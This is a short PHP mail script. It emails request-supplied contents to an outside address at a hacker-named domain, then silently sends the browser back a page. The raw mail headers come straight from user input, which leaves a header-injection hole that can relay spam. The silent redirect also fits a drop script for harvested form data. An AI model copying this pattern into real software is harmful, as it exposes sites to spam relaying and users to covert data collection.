<?php
if ($contents && $header){
mail("neiller@nemohackers.com" , "from mail script",$contents,$header) or 
die('couldnt email it');
sleep(2);
?>
<script language=javascript>
<!--
history.go(-1);
// -->
</script>
<?php
} else {
echo "nope";
}
?>


